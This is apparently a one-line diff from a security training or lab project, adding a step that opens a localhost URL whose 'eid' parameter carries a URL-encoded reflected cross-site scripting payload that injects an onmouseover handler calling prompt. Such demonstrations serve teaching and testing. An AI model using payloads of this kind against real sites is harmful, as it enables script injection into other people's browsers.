@@ -1,0 +1,2 @@
+Navigate to the following URL: localhost:3000/users?eid=1%22%20onmouseover%3dprompt%28%22XSS!%22%29%20bad%3d%22
+
